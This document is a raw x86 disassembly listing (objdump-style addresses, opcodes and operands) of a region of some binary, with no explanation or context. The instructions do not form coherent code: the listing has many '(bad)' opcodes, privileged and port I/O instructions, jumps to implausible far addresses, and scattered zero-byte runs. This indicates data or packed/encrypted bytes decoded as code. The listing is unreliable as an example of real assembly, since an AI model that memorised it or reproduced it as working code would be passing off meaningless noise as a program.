  42a286:	or     DWORD PTR [edx],0xd8e9ec74
  42a28c:	js     0x42a290
  42a28e:	push   ecx
  42a28f:	mov    ds:0xbc520ef2,al
  42a294:	cs iret 
  42a296:	fst    QWORD PTR [edi-0x500fabd4]
  42a29c:	lds    esp,FWORD PTR [eax-0x24]
  42a29f:	fisub  WORD PTR [edi+edx*4+0xeb1106f]
  42a2a6:	jmp    0x994b91bb
  42a2ab:	fwait
  42a2ac:	aaa    
  42a2ad:	jns    0x42a2d6
  42a2af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a2b0:	cs iret 
  42a2b2:	xchg   ebp,eax
  42a2b3:	fwait
  42a2b4:	sub    ebx,DWORD PTR [ebp+0xeb28d69]
  42a2ba:	mov    dh,0x7b
  42a2bc:	mov    edx,0xaf6900a5
  42a2c1:	xchg   edx,eax
  42a2c2:	rol    ch,0x77
  42a2c5:	inc    ecx
  42a2c6:	mov    ebp,DWORD PTR [edi-0x6a]
  42a2c9:	xchg   ebp,eax
  42a2ca:	add    al,0x0
  42a2cc:	add    BYTE PTR [eax],al
  42a2ce:	add    BYTE PTR [eax],al
  42a2d0:	sub    DWORD PTR [edi+0x67cc5e47],ebp
  42a2d6:	inc    edi
  42a2d7:	pop    ecx
  42a2d8:	sti    
  42a2d9:	stos   BYTE PTR es:[edi],al
  42a2da:	push   cs
  42a2db:	xor    edi,ecx
  42a2dd:	idiv   DWORD PTR [esi+0xf67a839]
  42a2e3:	add    BYTE PTR [ecx],ch
  42a2e5:	cmp    eax,0x31a75321
  42a2ea:	xchg   BYTE PTR [eax+edi*8-0x52],dl
  42a2ee:	push   cs
  42a2ef:	push   edi
  42a2f0:	jb     0x42a272
  42a2f2:	xchg   ebp,eax
  42a2f3:	cmp    al,0x67
  42a2f5:	sub    ch,al
  42a2f7:	je     0x42a2ee
  42a2f9:	cmc    
  42a2fa:	sub    dl,BYTE PTR [esi-0x7eda9145]
  42a300:	mov    eax,ds:0xdb000ead
  42a305:	cwde   
  42a306:	inc    edi
  42a307:	pop    esi
  42a308:	shl    al,cl
  42a30a:	bound  edx,QWORD PTR [ecx]
  42a30c:	xor    BYTE PTR [esi],bl
  42a30e:	inc    edi
  42a30f:	add    DWORD PTR [ecx-0x2a2d8c52],ebp
  42a315:	not    ebx
  42a317:	pop    ebx
  42a318:	inc    eax
  42a319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a31a:	add    al,BYTE PTR [eax]
  42a31c:	mov    ecx,0xe753ad67
  42a321:	mul    DWORD PTR [ecx]
  42a323:	pusha  
  42a324:	mov    bh,0x6e
  42a326:	in     al,dx
  42a327:	push   esi
  42a328:	add    bl,BYTE PTR [edi-0x39ac24c5]
  42a32e:	cdq    
  42a32f:	xchg   DWORD PTR [ecx-0x49],esi
  42a332:	push   cs
  42a333:	add    BYTE PTR [eax],al
  42a335:	add    BYTE PTR [eax],al
  42a337:	add    BYTE PTR [eax],al
  42a339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a33a:	mov    eax,0xb6398f3e
  42a33f:	pop    ebx
  42a340:	push   eax
  42a341:	nop
  42a342:	rcr    BYTE PTR [eax+eiz*2-0x76efa46f],cl
  42a349:	idiv   DWORD PTR [edi]
  42a34b:	adc    eax,DWORD PTR [eax]
  42a34d:	nop
  42a34e:	jo     0x42a393
  42a350:	cbw    
  42a352:	(bad)  
  42a353:	xchg   esp,eax
  42a354:	sbb    BYTE PTR [ecx-0x1fb0efa5],dl
  42a35a:	pop    eax
  42a35b:	inc    ebp
  42a35c:	data16 mov dh,bl
  42a35f:	xchg   ecx,eax
  42a360:	and    BYTE PTR [ecx-0x3fb0efa5],dl
  42a366:	add    BYTE PTR [ebp+0x7f],0x4c
  42a36a:	shr    BYTE PTR [ebx+0x43],0x94
  42a36e:	retf   
  42a36f:	push   0xffffff9b
  42a371:	enter  0x105a,0x0
  42a375:	call   0xf8427eba
  42a37a:	lds    eax,FWORD PTR [esi]
  42a37c:	push   esi
  42a37d:	sbb    esp,DWORD PTR [ebx+ecx*1]
  42a380:	inc    eax
  42a381:	out    dx,al
  42a382:	dec    eax
  42a383:	cmp    al,BYTE PTR [edi+0x4000d7a5]
  42a389:	nop
  42a38a:	out    0x91,al
  42a38c:	cmp    al,0x91
  42a38e:	pop    ebx
  42a38f:	adc    BYTE PTR [eax-0x39],dl
  42a392:	push   ecx
  42a393:	ins    BYTE PTR es:[edi],dx
  42a394:	sub    DWORD PTR [eax],0x5a
  42a397:	adc    BYTE PTR [eax],al
  42a399:	pusha  
  42a39a:	loop   0x42a335
  42a39c:	push   esp
  42a39d:	add    BYTE PTR [eax],al
  42a39f:	add    BYTE PTR [eax],al
  42a3a1:	add    BYTE PTR [ecx+0x789105b],dl
  42a3a7:	and    al,0x11
  42a3a9:	add    BYTE PTR [eax-0x6ea3662e],dl
  42a3af:	pop    ebx
  42a3b0:	adc    bl,bh
  42a3b2:	data16 in al,0xd6
  42a3b5:	and    esp,DWORD PTR [eax-0x6e636e2e]
  42a3bb:	pop    ebx
  42a3bc:	adc    BYTE PTR [ebp+0x355b20f],cl
  42a3c2:	nop
  42a3c3:	mov    dl,0xa5
  42a3c5:	jp     0x42a3d2
  42a3c7:	xor    dh,bh
  42a3c9:	add    edx,DWORD PTR [eax-0x6e7782c5]
  42a3cf:	mov    dl,0xf5
  42a3d1:	jp     0x42a3fe
  42a3d3:	cmp    dh,bh
  42a3d5:	add    edx,DWORD PTR [eax-0x6e7fbac5]
  42a3db:	mov    dl,0xf5
  42a3dd:	jp     0x42a3fa
  42a3df:	inc    edx
  42a3e0:	test   DWORD PTR [ebx],0x976d3b90
  42a3e6:	xchg   ecx,eax
  42a3e7:	mov    dl,0xf5
  42a3e9:	jp     0x42a3e6
  42a3eb:	dec    ecx
  42a3ec:	test   DWORD PTR [ebx],0x788c7190
  42a3f2:	rcl    DWORD PTR [eax],cl
  42a3f4:	or     al,0xc9
  42a3f6:	inc    ebp
  42a3f7:	mov    dh,0xf5
  42a3f9:	aad    0x16
  42a3fb:	arpl   si,cx
  42a3fd:	pop    ss
  42a3fe:	nop
  42a3ff:	mov    dl,0xf5
  42a401:	xor    eax,0x2dd9654
  42a406:	add    BYTE PTR [eax],al
  42a408:	add    BYTE PTR [eax],al
  42a40a:	add    BYTE PTR [ecx+edi*4+0x70],bl
  42a40e:	cmp    eax,0x3e965e8
  42a413:	nop
  42a414:	cmp    eax,0xb60dcdbc
  42a419:	cmc    
  42a41a:	shl    BYTE PTR [ecx+0x9],1
  42a41d:	jno    0x42a451
  42a41f:	ss mov dh,0xb4
  42a422:	add    eax,0x3b64160
  42a427:	sbb    eax,0x9002de30
  42a42c:	mov    dl,0xa0
  42a42e:	js     0x42a3bb
  42a430:	aaa    
  42a431:	das    
  42a432:	mov    bh,0x91
  42a434:	cmp    eax,0x6f9099f7
  42a439:	mov    BYTE PTR [eax-0x5df148ad],0x46
  42a440:	pop    edx
  42a441:	and    BYTE PTR [esi],ch
  42a443:	push   0x2a
  42a445:	inc    edi
  42a446:	call   0x2a756de
  42a44b:	jmp    0x942ae784
  42a450:	mov    dl,0x97
  42a452:	fucomp st(3)
  42a454:	xor    eax,0x5a967dd6
  42a459:	pop    eax
  42a45a:	pop    eax
  42a45b:	je     0x42a4c8
  42a45d:	push   esp
  42a45e:	mov    dl,0xad
  42a460:	or     cl,BYTE PTR [esi]
  42a462:	jmp    0x733484fa
  42a467:	cmp    DWORD PTR [ecx+eax*1],edx
  42a46a:	sub    DWORD PTR [ebp+edi*1+0x1595],ecx
  42a471:	add    BYTE PTR [eax],al
  42a473:	add    BYTE PTR [ebp+0x6b390eb2],dl
  42a479:	sbb    DWORD PTR [eax+0xeb2e077],0xffffffe9
  42a480:	stos   DWORD PTR es:[edi],eax
  42a481:	cmp    DWORD PTR [eax],eax
  42a483:	jmp    0xdd7dc1b
  42a488:	lea    esi,[edx-0x19ab93f2]
  42a48e:	adc    edi,DWORD PTR [ecx]
  42a490:	mov    ebx,0xd3fb6ec5
  42a495:	outs   dx,DWORD PTR ds:[esi]
  42a496:	fwait
  42a497:	addr16 hlt 
  42a499:	mov    dl,0xe
  42a49b:	jmp    0x6d071183
  42a4a0:	adc    dl,BYTE PTR [ebx]
  42a4a2:	push   cs
  42a4a3:	jmp    0x972ea73b
  42a4a8:	aaa    
  42a4a9:	cmp    al,0x6f
  42a4ab:	call   0xc3395743
  42a4b0:	jle    0x42a464
  42a4b2:	push   cs
  42a4b3:	mov    dh,0x52
  42a4b5:	mov    ah,0x1e
  42a4b7:	arpl   sp,cx
  42a4b9:	outs   dx,DWORD PTR ds:[esi]
  42a4ba:	dec    edx
  42a4bb:	add    BYTE PTR [edx],dh
  42a4bd:	clc    
  42a4be:	inc    eax
  42a4bf:	push   edi
  42a4c0:	add    bl,BYTE PTR [ebx]
  42a4c2:	xor    BYTE PTR [edx+esi*8],cl
  42a4c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a4c6:	je     0x42a4c9
  42a4c8:	repnz stos DWORD PTR es:[edi],eax
  42a4ca:	not    BYTE PTR [edi]
  42a4cc:	jae    0x42a481
  42a4ce:	push   cs
  42a4cf:	test   DWORD PTR [ecx-0x874e5de],edi
  42a4d5:	ds push cs
  42a4d7:	add    BYTE PTR [eax],al
  42a4d9:	add    BYTE PTR [eax],al
  42a4db:	add    BYTE PTR [eax],al
  42a4dd:	imul   ecx,DWORD PTR [ebp+0xf],0x8cc2a150
  42a4e4:	inc    DWORD PTR [esi-0x11]
  42a4e7:	into   
  42a4e8:	jne    0x42a550
  42a4ea:	dec    ebp
  42a4eb:	jmp    0x3939:0xe6ce968a
  42a4f2:	mov    bl,0x91
  42a4f4:	sar    BYTE PTR [ebp-0x5e716c43],0xb6
  42a4fb:	push   cs
  42a4fc:	add    bl,dl
  42a4fe:	mov    ch,0x3e
  42a500:	call   0x2a7b51
  42a505:	ins    DWORD PTR es:[edi],dx
  42a506:	repz bound eax,QWORD PTR [edi]
  42a509:	sti    
  42a50a:	repnz cmc 
  42a50c:	sub    cl,0xb2
  42a50f:	push   cs
  42a510:	push   ebx
  42a511:	cmp    DWORD PTR fs:[ebx],ebp
  42a514:	add    ecx,edi
  42a516:	mov    dl,0x5b
  42a518:	(bad)  
  42a519:	lods   eax,DWORD PTR ds:[esi]
  42a51a:	push   edx
  42a51b:	add    BYTE PTR [eax],al
  42a51d:	push   es
  42a51e:	ret    0x12de
  42a521:	jns    0x42a4d9
  42a523:	lea    edi,[esi+0xeb571]
  42a529:	inc    esi
  42a52a:	pushf  
  42a52b:	push   cs
  42a52c:	add    BYTE PTR [esi+0x41ce9581],bh
  42a532:	sbb    al,0xe2
  42a534:	inc    DWORD PTR [esi-0x11]
  42a537:	into   
  42a538:	je     0x42a4ca
  42a53a:	adc    ebp,DWORD PTR [ebp-0x6e]
  42a53d:	cmp    BYTE PTR [edx+0x10],bl
  42a540:	add    BYTE PTR [eax],al
  42a542:	add    BYTE PTR [eax],al
  42a544:	add    BYTE PTR [eax],al
  42a546:	rol    BYTE PTR [eax-0x21228bbe],cl
  42a54c:	inc    ebp
  42a54d:	push   esp
  42a54e:	xchg   ecx,eax
  42a54f:	pop    ebx
  42a550:	adc    BYTE PTR [edi+0xe10f445],al
  42a556:	nop
  42a557:	pop    ebx
  42a558:	ins    BYTE PTR es:[edi],dx
  42a559:	rcr    ah,0x7e
  42a55c:	addr16 inc ebx
  42a55e:	xchg   esp,eax
  42a55f:	sub    edi,DWORD PTR [ecx]
  42a561:	adc    eax,0xffd06ae4
  42a566:	sbb    ah,dh
  42a568:	xlat   BYTE PTR ds:[ebx]
  42a569:	add    BYTE PTR [eax-0x6fba92a5],dl
  42a56f:	shl    bl,cl
  42a571:	xchg   DWORD PTR [edi],esi
  42a573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a574:	rol    DWORD PTR [eax],cl
  42a576:	nop
  42a577:	pop    ebx
  42a578:	aaa    
  42a579:	or     al,0x5a
  42a57c:	adc    BYTE PTR [eax],al
  42a57e:	pop    ds
  42a57f:	outs   dx,DWORD PTR ds:[esi]
  42a580:	loopne 0x42a590
  42a582:	rcr    BYTE PTR [ebx+0x4e],1
  42a585:	inc    esp
  42a586:	mov    ah,0x8f
  42a588:	adc    DWORD PTR [ebp+0x63],ebx
  42a58b:	sub    al,0x1c
  42a58d:	call   0x86554134
  42a592:	dec    esp
  42a593:	mov    bh,0x2
  42a595:	push   edi
  42a596:	dec    edi
  42a597:	cmc    
  42a598:	push   esp
  42a599:	add    al,0x90
  42a59b:	loopne 0x42a56b
  42a59d:	and    edx,DWORD PTR [eax+ebp*4+0x4b0b51db]
  42a5a4:	loop   0x42a56e
  42a5a6:	adc    BYTE PTR [eax],0xf8
  42a5a9:	inc    edi
  42a5aa:	add    BYTE PTR [eax],al
  42a5ac:	add    BYTE PTR [eax],al
  42a5ae:	add    BYTE PTR [eax+0x67118ade],ah
  42a5b4:	(bad)  
  42a5b5:	nop
  42a5b6:	cmp    al,0x91
  42a5b8:	pop    ebx
  42a5b9:	adc    BYTE PTR [ebx],cl
  42a5bb:	push   esp
  42a5bc:	mov    dl,0x3e
  42a5be:	aam    0x26
  42a5c0:	ja     0x42a5b4
  42a5c2:	sub    BYTE PTR [ebp-0x683c179e],al
  42a5c8:	mov    al,ds:0xa49eb5c
  42a5cd:	test   DWORD PTR [ebx],0x7cd5e490
  42a5d3:	adc    al,BYTE PTR [esi]
  42a5d5:	test   DWORD PTR [ebx],0x6bca3990
  42a5db:	adc    eax,0xa8e88a7b
  42a5e0:	(bad)  
  42a5e1:	ror    DWORD PTR [edi],1
  42a5e3:	in     al,0xcd
  42a5e5:	enter  0x9955,0x3
  42a5e9:	out    0x76,al
  42a5eb:	rol    esp,1
  42a5ed:	in     al,0xbf
  42a5ef:	add    eax,0x5084c1d8
  42a5f4:	mov    dh,0x85
  42a5f6:	into   
  42a5f7:	cmp    al,bh
  42a5f9:	xchg   ecx,eax
  42a5fa:	adc    eax,edx
  42a5fc:	mov    dl,0x78
  42a5fe:	aas    
  42a5ff:	xchg   esp,eax
  42a600:	aaa    
  42a601:	mov    dh,0xae
  42a603:	test   DWORD PTR [ecx],edi
  42a605:	je     0x42a5d6
  42a607:	nop
  42a608:	mov    dl,0xf5
  42a60a:	jl     0x42a5a8
  42a60c:	sub    edi,DWORD PTR [esi-0x5292e4aa]
  42a612:	jl     0x42a614
  42a614:	add    BYTE PTR [eax],al
  42a616:	add    BYTE PTR [eax],al
  42a618:	adc    al,BYTE PTR [esi]
  42a61a:	test   DWORD PTR [ebx],0x84f72190
  42a620:	mov    ah,0x2a
  42a622:	test   al,0x9e
  42a625:	sub    al,0x4e
  42a627:	add    edx,DWORD PTR [eax+0xc5d07b2]
  42a62d:	mov    DWORD PTR [edx],eax
  42a62f:	add    DWORD PTR [edi],edx
  42a631:	jl     0x42a6b1
  42a633:	push   ebp
  42a634:	les    ebp,FWORD PTR [ebp+ebp*2+0x76]
  42a638:	adc    ch,BYTE PTR [esi-0x4d6c17f2]
  42a63e:	outs   dx,BYTE PTR ds:[esi]
  42a640:	sahf   
  42a641:	pop    edx
  42a642:	add    DWORD PTR [ecx-0x43b2f66d],ebp
  42a648:	sbb    eax,0x972b482d
  42a64d:	ins    BYTE PTR es:[edi],dx
  42a64e:	xchg   ecx,eax
  42a64f:	cmp    eax,0x9f41fd73
  42a654:	add    al,0x5a
  42a656:	inc    esp
  42a657:	jo     0x42a680
  42a659:	nop
  42a65a:	push   es
  42a65b:	inc    ecx
  42a65c:	sahf   
  42a65d:	clc    
  42a65e:	push   cs
  42a65f:	jmp    0x1fd50950
  42a664:	ss mov cl,0x20
  42a667:	sub    DWORD PTR [edx+0x41],edi
  42a66a:	psubsw mm2,QWORD PTR [ebx+0x3bc56b33]
  42a671:	xor    eax,0xf6d1ed4d
  42a676:	xor    dl,ch
  42a678:	xchg   ebx,eax
  42a679:	xor    eax,0x7cec
  42a67e:	add    BYTE PTR [eax],al
  42a680:	add    BYTE PTR [esi],bh
  42a682:	aas    
  42a683:	pop    ebx
  42a684:	lds    edx,FWORD PTR [edi+0x6fc3e55a]
  42a68a:	addr16 call 0x9864:0x97c8305d
  42a692:	mov    cl,0xe
  42a694:	jmp    0x4e5ffa77
  42a699:	scas   al,BYTE PTR es:[edi]
  42a69a:	addr16 xchg edx,eax
  42a69c:	mov    ds:0xc41ffe36,al
  42a6a1:	jnp    0x42a65b
  42a6a3:	cwde   
  42a6a4:	adc    eax,0xe9789ff0
  42a6a9:	scas   al,BYTE PTR es:[edi]
  42a6aa:	out    0x32,al
  42a6ac:	xor    DWORD PTR [ebx-0xfe21383],edx
  42a6b2:	repz jmp 0x42a6ca
  42a6b5:	mov    al,0xf3
  42a6b7:	inc    ebx
  42a6b8:	add    BYTE PTR [ecx],ah
  42a6ba:	sub    eax,0xeea90023
  42a6bf:	push   edx
  42a6c0:	and    al,0x1
  42a6c2:	xor    ecx,edi
  42a6c4:	je     0x42a69d
  42a6c6:	call   0x86d3cb25
  42a6cb:	hlt    
  42a6cc:	or     edi,DWORD PTR [edi]
  42a6ce:	xchg   ebx,eax
  42a6cf:	out    0x8b,eax
  42a6d1:	in     eax,dx
  42a6d2:	mov    eax,DWORD PTR [eax]
  42a6d4:	xor    ecx,ebx
  42a6d6:	arpl   WORD PTR [esi-0x3114c437],bx
  42a6dc:	sysenter 
  42a6de:	test   eax,0xc2854c95
  42a6e3:	xchg   ebx,eax
  42a6e4:	dec    esp
  42a6e5:	add    BYTE PTR [eax],al
  42a6e7:	add    BYTE PTR [eax],al
  42a6e9:	add    BYTE PTR [ebp-0x20200ba2],dl
  42a6ef:	xchg   ebx,eax
  42a6f0:	out    0x83,eax
  42a6f2:	mov    ah,0x5e
  42a6f4:	push   ebp
  42a6f5:	jne    0x42a6b0
  42a6f7:	out    0x18,eax
  42a6f9:	call   0x516d68
  42a6fe:	ret    0xf6a4
  42a701:	sub    al,0x58
  42a703:	scas   eax,DWORD PTR es:[edi]
  42a704:	push   cs
  42a705:	mov    ah,ch
  42a707:	mov    al,BYTE PTR [eax]
  42a709:	pop    edi
  42a70a:	pop    ds
  42a70b:	jp     0x42a752
  42a70d:	xor    ebp,0x4e
  42a710:	stos   BYTE PTR es:[edi],al
  42a711:	adc    al,0x29
  42a713:	adc    BYTE PTR [ebp+0x5d8558ec],0x56
  42a71a:	jb     0x42a71a
  42a71c:	aas    
  42a71d:	mov    edi,DWORD PTR [edx+0x33]
  42a720:	push   cs
  42a721:	add    cl,ch
  42a723:	out    0x69,eax
  42a725:	or     BYTE PTR [eax+0x72],dh
  42a728:	in     al,0x8b
  42a72a:	mov    dh,0x6e
  42a72c:	inc    ecx
  42a72d:	xor    eax,DWORD PTR [edi]
  42a72f:	out    dx,al
  42a730:	push   ecx
  42a731:	cld    
  42a732:	add    DWORD PTR [esi],ecx
  42a734:	jmp    0x44c0:0x6c4490ff
  42a73b:	stos   BYTE PTR es:[edi],al
  42a73c:	xor    esi,DWORD PTR [ebp-0x6c]
  42a73f:	out    0xce,al
  42a741:	mul    DWORD PTR [esi-0x37]
  42a744:	mov    ch,bh
  42a746:	mov    dh,0x8d
  42a748:	push   0xe1595011
  42a74d:	enter  0x0,0x0
  42a751:	add    BYTE PTR [eax],al
  42a753:	push   ecx
  42a754:	nop
  42a755:	push   ecx
  42a756:	jne    0x42a7ba
  42a758:	xchg   edx,eax
  42a759:	mov    ebx,0x67b91d0b
  42a75e:	inc    ebx
  42a75f:	add    cl,bh
  42a761:	sahf   
  42a762:	or     ebx,DWORD PTR [ebx]
  42a764:	sbb    al,0xe8
  42a766:	mov    ch,dl
  42a768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a769:	(bad)  [ebp+ecx*8-0x6d9a405d]
  42a770:	cwde   
  42a771:	inc    BYTE PTR [edi+0x3d101b81]
  42a777:	xchg   edx,eax
  42a778:	pop    edx
  42a779:	adc    BYTE PTR [eax],al
  42a77b:	fst    QWORD PTR [esi-0x6f]
  42a77e:	retf   0xb54f
  42a781:	out    0x2e,eax
  42a783:	pop    ecx
  42a784:	sbb    edi,ecx
  42a786:	ror    BYTE PTR [edi+0xb53230f],0x95
  42a78d:	pop    es
  42a78e:	and    ch,BYTE PTR [esi]
  42a790:	pop    ecx
  42a791:	xor    bl,BYTE PTR [ebx+0x1b]
  42a794:	sbb    dl,ch
  42a796:	push   esi
  42a797:	dec    ecx
  42a798:	push   ds
  42a799:	jmp    0x42a79a
  42a79b:	adc    dh,BYTE PTR [eax-0x2d]
  42a79e:	dec    esi
  42a79f:	mov    eax,gs:0xcbac7465
  42a7a5:	gs fld st(3)
  42a7a8:	sbb    edi,eax
  42a7aa:	inc    ecx
  42a7ab:	mov    al,ds:0x9f11a4ce
  42a7b0:	(bad)
  42a7b4:	mov    bl,0xb6
  42a7b6:	or     al,0x0
  42a7b8:	add    BYTE PTR [eax],al
  42a7ba:	add    BYTE PTR [eax],al
  42a7bc:	or     DWORD PTR [edi],eax
  42a7be:	ror    BYTE PTR [edi],cl
  42a7c0:	call   0x9046d28f
  42a7c5:	cs mov dh,0xb0
  42a7c8:	xchg   edx,eax
  42a7c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a7ca:	mov    ch,0x1b
  42a7cc:	jns    0x42a781
  42a7ce:	cmc    
  42a7cf:	add    eax,DWORD PTR ds:0x170bd9ff
  42a7d5:	jns    0x42a765
  42a7d7:	push   es
  42a7d8:	cmp    eax,0x169df5b2
  42a7dd:	out    dx,eax
  42a7de:	adc    esp,ebp
  42a7e0:	ffree  st(2)
  42a7e2:	sbb    al,0x4
  42a7e4:	nop
  42a7e5:	sub    eax,DWORD PTR [esi]
  42a7e7:	scas   eax,DWORD PTR es:[edi]
  42a7e8:	xchg   DWORD PTR [ecx-0x24],ebp
  42a7eb:	jle    0x42a83d
  42a7ed:	(bad)  
  42a7ef:	popf   
  42a7f0:	mov    esi,0xf24ea874
  42a7f5:	lods   eax,DWORD PTR ds:[esi]
  42a7f6:	lods   eax,DWORD PTR ss:[esi]
  42a7f8:	push   edi
  42a7f9:	shl    BYTE PTR [eax-0x40],1
  42a7fc:	mov    bl,0xf6
  42a7fe:	xchg   ebx,eax
  42a7ff:	jle    0x42a851
  42a801:	fsubp  st(7),st
  42a803:	popf   
  42a804:	xchg   BYTE PTR [eax+ecx*4+0x42],dh
  42a808:	mov    dl,0xad
  42a80a:	lods   eax,DWORD PTR ss:[esi]
  42a80c:	sti    
  42a80d:	ss push ecx
  42a80f:	fs xchg ecx,eax
  42a811:	mov    dl,0xf5
  42a813:	int3   
  42a814:	push   ecx
  42a815:	out    dx,al
  42a816:	ror    DWORD PTR ds:0xe03a7090,1
  42a81c:	xor    BYTE PTR [ebx+0xecc],0x0
  42a823:	add    BYTE PTR [eax],al
  42a825:	or     al,0xc3
  42a827:	xor    eax,0xcd721504
  42a82c:	mov    cs,WORD PTR [esi+ecx*4+0x9]
  42a830:	sbb    al,0xc4
  42a832:	div    ebp
  42a834:	add    ecx,DWORD PTR [edi]
  42a836:	bound  ecx,QWORD PTR [edi]
  42a838:	ins    BYTE PTR es:[edi],dx
  42a839:	mov    ebp,0x275c42de
  42a83e:	xchg   ebp,eax
  42a83f:	cmp    DWORD PTR cs:[ecx+0x7c],ebx
  42a843:	test   DWORD PTR [edx+0x6cec68c1],0x6924ea53
  42a84d:	out    dx,eax
  42a84e:	xchg   esp,eax
  42a84f:	inc    edx
  42a850:	jmp    0xe1759e9b
  42a855:	out    0xcc,eax
  42a857:	js     0x42a842
  42a859:	ret    0x97f8
  42a85c:	lahf   
  42a85d:	mov    edi,DWORD PTR [ebx+0x2e93e93d]
  42a863:	iret   
  42a864:	aad    0x8f
  42a866:	xor    ebp,ebx
  42a868:	inc    ecx
  42a869:	and    eax,0xbe90ef7
  42a86e:	out    dx,eax
  42a86f:	xor    bl,bl
  42a871:	cwde   
  42a872:	mov    ebx,0xf862e878
  42a877:	xchg   edi,eax
  42a878:	daa    
  42a879:	mov    edx,DWORD PTR [ebp+0x3f]
  42a87c:	jmp    0xcd95e314
  42a881:	sub    BYTE PTR [edi],0x1d
  42a884:	adc    ecx,ebp
  42a886:	mov    ebx,0xe90e
  42a88b:	add    BYTE PTR [eax],al
  42a88d:	add    al,cl
  42a88f:	jl     0x42a888
  42a891:	pop    edx
  42a892:	cmp    al,0x68
  42a894:	in     al,dx
  42a895:	imul   esi,edi,0xb8e94293
  42a89b:	xchg   ebp,eax
  42a89c:	neg    bl
  42a89e:	push   ebx
  42a89f:	push   0x6d54ea60
  42a8a4:	ret    0xf069
  42a8a7:	xchg   ebx,eax
  42a8a8:	add    cl,ch
  42a8aa:	push   DWORD PTR [ebx-0x31411762]
  42a8b0:	mov    cs,WORD PTR [ebp-0x8]
  42a8b3:	mov    eax,0x3006000e
  42a8b8:	push   es
  42a8b9:	push   DWORD PTR [esi]
  42a8bb:	xchg   esp,eax
  42a8bc:	cdq    
  42a8bd:	adc    DWORD PTR [ecx-0x53],0xe
  42a8c1:	add    BYTE PTR [ecx-0x240ffe6d],cl
  42a8c7:	jae    0x42a8b5
  42a8c9:	mov    WORD PTR [ebp+0x628d0c5a],gs
  42a8cf:	push   cs
  42a8d0:	(bad)  
  42a8d2:	mov    ecx,0x21cf9523
  42a8d7:	sub    eax,0x3aa9005a
  42a8dc:	iret   
  42a8dd:	js     0x42a958
  42a8df:	aaa    
  42a8e0:	fild   QWORD PTR [ebx+0x1f]
  42a8e3:	xchg   ch,ch
  42a8e5:	ss ret 
  42a8e7:	mov    bl,0x99
  42a8e9:	dec    esp
  42a8ea:	lea    esi,[edx+0x3f2503d]
  42a8f0:	idiv   DWORD PTR [eax+eax*1+0x0]
  42a8f4:	add    BYTE PTR [eax],al
  42a8f6:	add    BYTE PTR [ecx-0x4d],cl
  42a8f9:	push   cs
  42a8fa:	mov    dh,BYTE PTR [ecx-0x4884db6a]
  42a900:	xchg   ebx,eax
  42a901:	xchg   ebx,eax
  42a902:	iret   
  42a903:	lock jl 0x42a916
  42a906:	call   0x2f2a7d
  42a90b:	loop   0x42a957
  42a90d:	xor    BYTE PTR [esp+eiz*8],dl
  42a910:	cmp    al,0x77
  42a912:	add    DWORD PTR [ecx],edi
  42a914:	mov    bl,0x3e
  42a916:	(bad)  
  42a917:	jl     0x42a951
  42a919:	lods   al,BYTE PTR ds:[esi]
  42a91a:	pop    edi
  42a91b:	div    DWORD PTR [ecx+0x45]
  42a91e:	sub    DWORD PTR [ebp+0x6e],0xffffffaa
  42a922:	add    al,0x39
  42a924:	adc    eax,0x4eed8d0f
  42a929:	or     BYTE PTR [eax-0x5e],dl
  42a92c:	add    al,0xf7
  42a92e:	adc    BYTE PTR [esi-0x52],ah
  42a931:	push   cs
  42a932:	mov    dl,BYTE PTR [eax+0x7cd79421]
  42a938:	sub    al,0x9d
  42a93a:	je     0x42a8f0
  42a93c:	test   DWORD PTR [ebp+0x105a6cba],edx
  42a942:	add    BYTE PTR [edi+ebx*4+0x5c],dh
  42a946:	xchg   ax,ax
  42a948:	aam    0x40
  42a94a:	call   0x5553d9
  42a94f:	jmp    0x42a958
  42a951:	xchg   ebp,eax
  42a952:	in     al,dx
  42a953:	push   esp
  42a954:	lods   al,BYTE PTR ds:[esi]
  42a955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a956:	push   ecx
  42a957:	sbb    esi,DWORD PTR [edx]
  42a959:	test   eax,0x8c
  42a95e:	add    BYTE PTR [eax],al
  42a960:	adc    eax,0x900011c1
  42a965:	leave  
  42a966:	(bad)  
  42a967:	(bad)  
  42a968:	sbb    DWORD PTR [ebp+0x7da717f6],edx
  42a96e:	add    BYTE PTR [esi],cl
  42a970:	push   eax
  42a971:	pop    ecx
  42a972:	popf   
  42a973:	mov    ebp,0x105a2c
  42a978:	fisttp WORD PTR [eax+ebx*4+0x18]
  42a97c:	xchg   ecx,eax
  42a97d:	pop    ebx
  42a97e:	adc    BYTE PTR [ebp+0x137c15],cl
  42a984:	nop
  42a985:	loopne 0x42a962
  42a987:	and    ecx,eax
  42a989:	ror    BYTE PTR [eax],1
  42a98b:	addr16 pop esi
  42a98d:	fs adc eax,0x18160d30
  42a993:	push   eax
  42a994:	push   0x4fffa2f9
  42a999:	xlat   BYTE PTR ds:[ebx]
  42a99a:	dec    edi
  42a99b:	or     ebx,DWORD PTR [ecx]
  42a99d:	(bad)  
  42a99e:	lldt   WORD PTR [eax-0x2bdc2a9b]
  42a9a5:	pop    edx
  42a9a6:	xchg   DWORD PTR [ecx],ecx
  42a9a8:	sbb    ebx,DWORD PTR [eax]
  42a9aa:	hlt    
  42a9ab:	push   edi
  42a9ac:	adc    esp,esp
  42a9ae:	adc    ebp,DWORD PTR [esi]
  42a9b0:	(bad)  
  42a9b1:	mov    dl,0x62
  42a9b3:	cmp    BYTE PTR [eax+0x5419f5b2],dl
  42a9b9:	mov    fs,WORD PTR [ecx]
  42a9bb:	push   es
  42a9bc:	fwait
  42a9bd:	cs addr16 add al,0x90
  42a9c1:	mov    dl,0x3f
  42a9c3:	fadd   QWORD PTR [eax]
  42a9c5:	add    BYTE PTR [eax],al
  42a9c7:	add    BYTE PTR [eax],al
  42a9c9:	add    al,0xef
  42a9cb:	adc    DWORD PTR [eax],eax
  42a9cd:	inc    edx
  42a9ce:	add    ah,BYTE PTR [ebp+0x35bc4bf7]
  42a9d4:	add    al,0x5f
  42a9d6:	outs   dx,BYTE PTR ds:[esi]
  42a9d7:	loop   0x42a967
  42a9d9:	sbb    eax,0x9003f6db
  42a9de:	cld    
  42a9df:	test   bh,dh
